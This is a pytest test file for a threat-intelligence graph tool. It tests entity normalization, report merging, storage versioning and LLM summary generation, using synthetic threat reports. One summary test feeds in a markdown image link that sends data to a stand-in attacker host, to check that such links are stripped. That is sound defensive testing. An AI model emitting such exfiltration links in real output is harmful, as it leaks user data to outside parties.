"""Graph, normalization, merging and storage tests. No API calls."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from extract.iocs import extract_iocs
from extract.llm_extract import MergedEntity, MergedRelationship, ReportAnalysis
from extract.models import IOCExtraction
from graph.merge import merge_report, remove_report
from graph.model import (
    REPORTED_IN,
    graph_stats,
    neighborhood,
    new_graph,
    node_relationships,
    related_indicators,
    top_nodes_by_degree,
)
from graph.normalize import find_possible_duplicates, node_id, normalize_key, report_node_id
from graph.persist import merge_and_save, remove_and_save, save_graph_with_retry
from graph.summaries import evidence_hash, generate_summary, summary_is_current
from ingest.models import Document, join_pages
from llm.base import LLMResponse
from storage.base import VersionConflict
from storage.local import LocalGraphStore

REPORT_A = (
    "Indicators of Compromise\n\n"
    "APT21 deployed the Akira ransomware against healthcare targets. "
    "The group exploited CVE-2024-3400 for initial access. "
    "The malware beaconed to 45.66.77.88 every five minutes."
)

REPORT_B = (
    "Indicators of Compromise\n\n"
    "APT 21 returned in June using the Mimikatz tool for credential theft. "
    "Traffic was seen to 91.92.93.94 during the intrusion."
)


def make_doc(text: str, sha: str, filename: str) -> Document:
    pages = [text]
    return Document(
        filename=filename,
        file_type="pdf",
        sha256=sha,
        size_bytes=len(text),
        page_count=1,
        pages=pages,
        tables=[],
        text=join_pages(pages),
    )


def analysis_for(
    entities: list[tuple[str, str]],
    relationships: list[tuple[str, str, str]],
    evidence: str,
    model: str = "claude-haiku-4-5",
) -> ReportAnalysis:
    return ReportAnalysis(
        document_sha256="unused",
        model=model,
        prompt_version="v1",
        entities=[
            MergedEntity(name=name, type=etype, evidence=[evidence], descriptions=["desc"])
            for name, etype in entities
        ],
        relationships=[
            MergedRelationship(source=src, relation=rel, target=tgt, evidence=[evidence])
            for src, rel, tgt in relationships
        ],
    )


@pytest.fixture
def doc_a() -> Document:
    return make_doc(REPORT_A, "a" * 64, "report_a.pdf")


@pytest.fixture
def doc_b() -> Document:
    return make_doc(REPORT_B, "b" * 64, "report_b.pdf")


@pytest.fixture
def iocs_a(doc_a) -> IOCExtraction:
    return extract_iocs(doc_a)


@pytest.fixture
def iocs_b(doc_b) -> IOCExtraction:
    return extract_iocs(doc_b)


@pytest.fixture
def analysis_a() -> ReportAnalysis:
    return analysis_for(
        [("APT21", "threat-actor"), ("Akira", "malware"), ("CVE-2024-3400", "vulnerability")],
        [("APT21", "uses", "Akira"), ("APT21", "exploits", "CVE-2024-3400")],
        "APT21 deployed the Akira ransomware against healthcare targets.",
    )


@pytest.fixture
def analysis_b() -> ReportAnalysis:
    return analysis_for(
        [("APT 21", "threat-actor"), ("Mimikatz", "tool")],
        [("APT 21", "uses", "Mimikatz")],
        "APT 21 returned in June using the Mimikatz tool for credential theft.",
    )


class TestNormalization:
    @pytest.mark.parametrize("name", ["APT21", "APT 21", "APT-21", "apt21", "APT_21", "apt 021"])
    def test_actor_variants_collapse(self, name: str) -> None:
        assert normalize_key("threat-actor", name) == "apt21"

    def test_other_actor_prefixes(self) -> None:
        assert normalize_key("threat-actor", "UNC 2452") == "unc2452"
        assert normalize_key("threat-actor", "FIN-7") == "fin7"
        assert normalize_key("threat-actor", "TA505") == "ta505"

    def test_different_actors_do_not_collapse(self) -> None:
        assert normalize_key("threat-actor", "APT21") != normalize_key("threat-actor", "APT28")

    def test_cve_case_and_spacing(self) -> None:
        for name in ["CVE-2024-3400", "cve-2024-3400", "CVE 2024 3400"]:
            assert normalize_key("vulnerability", name) == "cve-2024-3400"

    def test_technique_id_is_the_key(self) -> None:
        assert normalize_key("attack-pattern", "T1059.001") == "t1059.001"
        assert normalize_key("attack-pattern", "Scheduled Task (T1053)") == "t1053"

    def test_attack_pattern_without_id_uses_the_name(self) -> None:
        assert normalize_key("attack-pattern", "Spearphishing Attachment") == "spearphishing attachment"

    def test_indicator_key_includes_ioc_type(self) -> None:
        domain = normalize_key("indicator", "evil.com", "domain")
        url = normalize_key("indicator", "evil.com", "url")
        assert domain != url
        assert "domain" in domain

    def test_malware_name_punctuation_is_normalized(self) -> None:
        assert normalize_key("malware", "Akira.") == normalize_key("malware", "Akira")

    def test_alias_map_is_applied(self, monkeypatch, tmp_path) -> None:
        import graph.normalize as normalize_module

        alias_file = tmp_path / "aliases.json"
        alias_file.write_text(json.dumps({"bronze silhouette": "volt typhoon"}))
        monkeypatch.setattr(normalize_module, "ALIASES_PATH", alias_file)
        normalize_module.load_alias_map.cache_clear()
        try:
            assert normalize_module.normalize_key("threat-actor", "BRONZE SILHOUETTE") == "volt typhoon"
        finally:
            normalize_module.load_alias_map.cache_clear()

    def test_node_id_format(self) -> None:
        assert node_id("threat-actor", "apt21") == "threat-actor--apt21"
        assert node_id("indicator", "ipv4--203.0.113.5") == "indicator--ipv4--203.0.113.5"

    def test_report_node_id_uses_hash_prefix(self) -> None:
        assert report_node_id("a" * 64) == "report--" + "a" * 12


class TestMerging:
    def test_entities_and_indicators_become_nodes(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        assert "threat-actor--apt21" in graph
        assert "malware--akira" in graph
        assert "vulnerability--cve-2024-3400" in graph
        assert "indicator--ipv4--45.66.77.88" in graph

    def test_regex_indicator_present_even_if_llm_ignored_it(self, doc_a, iocs_a) -> None:
        empty = analysis_for([], [], "")
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, empty)
        assert "indicator--ipv4--45.66.77.88" in graph

    def test_report_node_carries_provenance(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a, ingested_by="Karan")
        report = graph.nodes[report_node_id(doc_a.sha256)]
        assert report["filename"] == "report_a.pdf"
        assert report["ingested_by"] == "Karan"
        assert report["model"] == "claude-haiku-4-5"

    def test_reported_in_edge_exists(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        report_id = report_node_id(doc_a.sha256)
        assert graph.has_edge("threat-actor--apt21", report_id, key=REPORTED_IN)

    def test_two_reports_mentioning_apt21_yield_one_node(
        self, doc_a, iocs_a, analysis_a, doc_b, iocs_b, analysis_b
    ) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        merge_report(graph, doc_b, iocs_b, analysis_b)

        actors = [n for n, a in graph.nodes(data=True) if a.get("type") == "threat-actor"]
        assert actors == ["threat-actor--apt21"]
        node = graph.nodes["threat-actor--apt21"]
        assert len(node["reports"]) == 2

    def test_second_spelling_becomes_an_alias(
        self, doc_a, iocs_a, analysis_a, doc_b, iocs_b, analysis_b
    ) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        merge_report(graph, doc_b, iocs_b, analysis_b)
        node = graph.nodes["threat-actor--apt21"]
        assert node["name"] == "APT21"
        assert "APT 21" in node["aliases"]

    def test_remerge_is_idempotent(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        nodes_before = graph.number_of_nodes()
        edges_before = graph.number_of_edges()
        evidence_before = len(graph.nodes["threat-actor--apt21"]["evidence"])

        merge_report(graph, doc_a, iocs_a, analysis_a)

        assert graph.number_of_nodes() == nodes_before
        assert graph.number_of_edges() == edges_before
        assert len(graph.nodes["threat-actor--apt21"]["evidence"]) == evidence_before

    def test_remerge_three_times_still_stable(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        for _ in range(3):
            merge_report(graph, doc_a, iocs_a, analysis_a)
        assert len(graph.nodes["threat-actor--apt21"]["reports"]) == 1

    def test_relationships_become_edges(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        assert graph.has_edge("threat-actor--apt21", "malware--akira", key="uses")
        assert graph.has_edge(
            "threat-actor--apt21", "vulnerability--cve-2024-3400", key="exploits"
        )

    def test_merge_stats_are_reported(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        stats = merge_report(graph, doc_a, iocs_a, analysis_a)
        assert stats.new_nodes > 0
        assert stats.new_edges > 0
        assert stats.by_type.get("threat-actor") == 1


class TestRemoval:
    def test_remove_report_deletes_orphans(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        remove_report(graph, report_node_id(doc_a.sha256))
        assert graph.number_of_nodes() == 0

    def test_remove_report_keeps_shared_nodes(
        self, doc_a, iocs_a, analysis_a, doc_b, iocs_b, analysis_b
    ) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        merge_report(graph, doc_b, iocs_b, analysis_b)

        remove_report(graph, report_node_id(doc_a.sha256))

        # APT21 appears in both reports, so it survives; Akira was only in report A.
        assert "threat-actor--apt21" in graph
        assert "malware--akira" not in graph
        assert graph.nodes["threat-actor--apt21"]["reports"] == [report_node_id(doc_b.sha256)]

    def test_removed_report_evidence_is_gone(
        self, doc_a, iocs_a, analysis_a, doc_b, iocs_b, analysis_b
    ) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        merge_report(graph, doc_b, iocs_b, analysis_b)
        report_a = report_node_id(doc_a.sha256)
        remove_report(graph, report_a)
        for entry in graph.nodes["threat-actor--apt21"]["evidence"]:
            assert entry["report_id"] != report_a

    def test_removing_unknown_report_is_a_noop(self) -> None:
        graph = new_graph()
        stats = remove_report(graph, "report--doesnotexist")
        assert stats.removed_nodes == 0


class TestGraphQueries:
    def test_graph_stats(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        stats = graph_stats(graph)
        assert stats["reports"] == 1
        assert stats["nodes"] == graph.number_of_nodes()

    def test_neighborhood_depth_one(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        sub = neighborhood(graph, "threat-actor--apt21", depth=1)
        assert "threat-actor--apt21" in sub
        assert "malware--akira" in sub

    def test_neighborhood_excludes_reports_by_default(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        sub = neighborhood(graph, "threat-actor--apt21", depth=1)
        assert report_node_id(doc_a.sha256) not in sub

    def test_neighborhood_respects_max_nodes(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        sub = neighborhood(graph, "threat-actor--apt21", depth=2, max_nodes=2)
        assert sub.number_of_nodes() <= 2

    def test_unknown_center_returns_empty(self) -> None:
        assert neighborhood(new_graph(), "nope").number_of_nodes() == 0

    def test_node_relationships_grouped(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        grouped = node_relationships(graph, "threat-actor--apt21")
        assert "uses" in grouped
        assert grouped["uses"][0]["name"] == "Akira"
        assert REPORTED_IN not in grouped

    def test_related_indicators(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        # Relate the actor to the indicator so it shows up as a neighbour.
        extended = analysis_for(
            [("APT21", "threat-actor"), ("45.66.77.88", "indicator")],
            [("APT21", "communicates-with", "45.66.77.88")],
            "The malware beaconed to 45.66.77.88 every five minutes.",
        )
        merge_report(graph, doc_a, iocs_a, extended)
        indicators = related_indicators(graph, "threat-actor--apt21")
        assert any(item["name"] == "45.66.77.88" for item in indicators)

    def test_top_nodes_by_degree(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        top = top_nodes_by_degree(graph, limit=3)
        assert "threat-actor--apt21" in top


class TestDuplicateDetection:
    def test_similar_names_are_surfaced(self) -> None:
        graph = new_graph()
        graph.add_node("malware--akira", type="malware", name="Akira")
        graph.add_node("malware--akira ransomware", type="malware", name="Akira Ransomware")
        pairs = find_possible_duplicates(graph, threshold=80)
        assert len(pairs) == 1

    def test_different_names_are_not_surfaced(self) -> None:
        graph = new_graph()
        graph.add_node("malware--akira", type="malware", name="Akira")
        graph.add_node("malware--lockbit", type="malware", name="LockBit")
        assert find_possible_duplicates(graph, threshold=90) == []

    def test_different_types_are_never_paired(self) -> None:
        graph = new_graph()
        graph.add_node("malware--akira", type="malware", name="Akira")
        graph.add_node("tool--akira", type="tool", name="Akira")
        assert find_possible_duplicates(graph, threshold=90) == []

    def test_nothing_is_merged_automatically(self) -> None:
        graph = new_graph()
        graph.add_node("malware--akira", type="malware", name="Akira")
        graph.add_node("malware--akira ransomware", type="malware", name="Akira Ransomware")
        find_possible_duplicates(graph, threshold=80)
        assert graph.number_of_nodes() == 2


class TestLocalStorage:
    def test_empty_load_is_version_zero(self, tmp_path: Path) -> None:
        store = LocalGraphStore(tmp_path)
        graph, version = store.load()
        assert version == 0
        assert graph.number_of_nodes() == 0

    def test_save_then_load_roundtrip(self, tmp_path: Path, doc_a, iocs_a, analysis_a) -> None:
        store = LocalGraphStore(tmp_path)
        graph, version = store.load()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        new_version = store.save(graph, version)
        assert new_version == 1

        reloaded, loaded_version = store.load()
        assert loaded_version == 1
        assert "threat-actor--apt21" in reloaded
        assert reloaded.nodes["threat-actor--apt21"]["name"] == "APT21"

    def test_multigraph_survives_roundtrip(self, tmp_path: Path, doc_a, iocs_a) -> None:
        store = LocalGraphStore(tmp_path)
        graph, version = store.load()
        analysis = analysis_for(
            [("APT21", "threat-actor"), ("Akira", "malware")],
            [("APT21", "uses", "Akira"), ("APT21", "related-to", "Akira")],
            "APT21 deployed the Akira ransomware against healthcare targets.",
        )
        merge_report(graph, doc_a, iocs_a, analysis)
        store.save(graph, version)
        reloaded, _ = store.load()
        assert reloaded.number_of_edges("threat-actor--apt21", "malware--akira") == 2

    def test_stale_version_raises_conflict(self, tmp_path: Path) -> None:
        store = LocalGraphStore(tmp_path)
        graph, version = store.load()
        store.save(graph, version)
        with pytest.raises(VersionConflict):
            store.save(graph, version)  # version is now 1, not 0

    def test_saved_file_is_valid_json(self, tmp_path: Path) -> None:
        store = LocalGraphStore(tmp_path)
        graph, version = store.load()
        store.save(graph, version)
        payload = json.loads((tmp_path / "graph.json").read_text())
        assert payload["version"] == 1
        assert "graph" in payload

    def test_no_temp_files_left_behind(self, tmp_path: Path) -> None:
        store = LocalGraphStore(tmp_path)
        graph, version = store.load()
        store.save(graph, version)
        assert list(tmp_path.glob("*.tmp")) == []

    def test_backups_rotate_to_five(self, tmp_path: Path) -> None:
        store = LocalGraphStore(tmp_path)
        graph, version = store.load()
        for _ in range(8):
            version = store.save(graph, version)
        assert len(store.list_backups()) == 5

    def test_restore_backup_moves_version_forward(self, tmp_path: Path, doc_a, iocs_a, analysis_a) -> None:
        store = LocalGraphStore(tmp_path)
        graph, version = store.load()
        version = store.save(graph, version)  # v1, empty

        graph, version = store.load()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        version = store.save(graph, version)  # v2, populated

        restored_version = store.restore_backup(1)
        assert restored_version > version
        reloaded, _ = store.load()
        assert reloaded.number_of_nodes() == 0

    def test_cache_roundtrip(self, tmp_path: Path) -> None:
        store = LocalGraphStore(tmp_path)
        assert store.cache_get("missing") is None
        store.cache_set("key1", {"a": 1})
        assert store.cache_get("key1") == {"a": 1}

    def test_run_storage(self, tmp_path: Path) -> None:
        store = LocalGraphStore(tmp_path)
        store.save_run("20260101_abc", {"status": "ok"})
        runs = store.list_runs()
        assert runs and runs[0]["status"] == "ok"


class TestPersistWithRetry:
    def test_merge_and_save(self, tmp_path: Path, doc_a, iocs_a, analysis_a) -> None:
        store = LocalGraphStore(tmp_path)
        stats, version = merge_and_save(store, doc_a, iocs_a, analysis_a)
        assert version == 1
        assert stats.new_nodes > 0

    def test_concurrent_writer_is_merged_not_overwritten(
        self, tmp_path: Path, doc_a, iocs_a, analysis_a, doc_b, iocs_b, analysis_b
    ) -> None:
        """Two sessions saving around each other must both end up in the graph."""
        store = LocalGraphStore(tmp_path)

        class ConflictOnce(LocalGraphStore):
            """Simulates another session saving between our load and our save."""

            def __init__(self, path, other):
                super().__init__(path)
                self._tripped = False
                self._other = other

            def save(self, graph, expected_version):
                if not self._tripped:
                    self._tripped = True
                    # Another session commits first.
                    fresh, fresh_version = super().load()
                    merge_report(fresh, *self._other)
                    super().save(fresh, fresh_version)
                return super().save(graph, expected_version)

        racing = ConflictOnce(tmp_path, (doc_b, iocs_b, analysis_b))
        stats, version = merge_and_save(racing, doc_a, iocs_a, analysis_a)

        final, _ = store.load()
        assert report_node_id(doc_a.sha256) in final
        assert report_node_id(doc_b.sha256) in final
        assert "malware--akira" in final
        assert "tool--mimikatz" in final

    def test_conflict_gives_up_after_max_attempts(self, tmp_path: Path, doc_a, iocs_a, analysis_a) -> None:
        class AlwaysConflict(LocalGraphStore):
            def save(self, graph, expected_version):
                raise VersionConflict(expected_version, expected_version + 1)

        with pytest.raises(VersionConflict):
            merge_and_save(AlwaysConflict(tmp_path), doc_a, iocs_a, analysis_a, max_attempts=2)

    def test_remove_and_save(self, tmp_path: Path, doc_a, iocs_a, analysis_a) -> None:
        store = LocalGraphStore(tmp_path)
        merge_and_save(store, doc_a, iocs_a, analysis_a)
        remove_and_save(store, report_node_id(doc_a.sha256))
        graph, _ = store.load()
        assert graph.number_of_nodes() == 0

    def test_save_graph_with_retry_applies_mutation(self, tmp_path: Path, doc_a, iocs_a, analysis_a) -> None:
        store = LocalGraphStore(tmp_path)
        merge_and_save(store, doc_a, iocs_a, analysis_a)

        def mutate(graph):
            graph.nodes["threat-actor--apt21"]["summary"] = "written"

        save_graph_with_retry(store, mutate)
        graph, _ = store.load()
        assert graph.nodes["threat-actor--apt21"]["summary"] == "written"


class FakeSummaryProvider:
    """Returns a canned summary and counts calls."""

    name = "fake"

    def __init__(self, text: str = "APT21 is a threat actor that deploys Akira ransomware."):
        self.text = text
        self.calls = 0

    def extract_structured(self, system, user, schema, model, max_tokens=4000):
        self.calls += 1
        return LLMResponse(
            data={"summary": self.text},
            input_tokens=500,
            output_tokens=60,
            model=model,
            latency_ms=10,
            stop_reason="end_turn",
        )


class TestSummaries:
    def test_summary_is_generated_and_stored(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        provider = FakeSummaryProvider()
        summary, cost = generate_summary(graph, "threat-actor--apt21", provider, "claude-haiku-4-5")
        assert "APT21" in summary
        assert cost > 0
        assert graph.nodes["threat-actor--apt21"]["summary"] == summary

    def test_summary_is_current_after_generation(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        generate_summary(graph, "threat-actor--apt21", FakeSummaryProvider(), "claude-haiku-4-5")
        assert summary_is_current(graph.nodes["threat-actor--apt21"]) is True

    def test_summary_goes_stale_when_evidence_changes(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        generate_summary(graph, "threat-actor--apt21", FakeSummaryProvider(), "claude-haiku-4-5")

        graph.nodes["threat-actor--apt21"]["evidence"].append(
            {"report_id": "report--new", "quote": "New evidence appeared.", "page": 1}
        )
        assert summary_is_current(graph.nodes["threat-actor--apt21"]) is False

    def test_markdown_in_summary_is_stripped(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        provider = FakeSummaryProvider("See ![x](https://attacker.test/?d=leak) for details.")
        summary, _ = generate_summary(graph, "threat-actor--apt21", provider, "claude-haiku-4-5")
        assert "attacker.test" not in summary

    def test_summary_is_word_capped(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        provider = FakeSummaryProvider("word " * 400)
        summary, _ = generate_summary(graph, "threat-actor--apt21", provider, "claude-haiku-4-5")
        assert len(summary.split()) <= 121

    def test_node_with_no_evidence_makes_no_call(self) -> None:
        graph = new_graph()
        graph.add_node("malware--x", type="malware", name="X", evidence=[], descriptions=[])
        provider = FakeSummaryProvider()
        summary, cost = generate_summary(graph, "malware--x", provider, "claude-haiku-4-5")
        assert provider.calls == 0
        assert cost == 0.0

    def test_evidence_hash_is_order_sensitive(self) -> None:
        assert evidence_hash(["a", "b"], []) != evidence_hash(["b", "a"], [])

    def test_indicators_are_excluded_from_duplicate_detection(self) -> None:
        """http:// and https:// variants of one URL are different indicators, not duplicates."""
        graph = new_graph()
        graph.add_node(
            "indicator--url--http://host/x", type="indicator", name="http://host/x", ioc_type="url"
        )
        graph.add_node(
            "indicator--url--https://host/x",
            type="indicator",
            name="https://host/x",
            ioc_type="url",
        )
        assert find_possible_duplicates(graph, threshold=90) == []


class TestIsolatedIndicatorFallback:
    def test_indicator_with_only_a_report_edge_still_shows_the_report(
        self, doc_a, iocs_a
    ) -> None:
        """Regex indicators the model never mentioned must not render as a lone dot."""
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_for([], [], ""))
        indicator = "indicator--ipv4--45.66.77.88"
        assert indicator in graph

        sub = neighborhood(graph, indicator, depth=1, include_reports=False)
        assert sub.number_of_nodes() > 1
        assert report_node_id(doc_a.sha256) in sub

    def test_well_connected_node_still_excludes_reports(self, doc_a, iocs_a, analysis_a) -> None:
        graph = new_graph()
        merge_report(graph, doc_a, iocs_a, analysis_a)
        sub = neighborhood(graph, "threat-actor--apt21", depth=1, include_reports=False)
        assert report_node_id(doc_a.sha256) not in sub
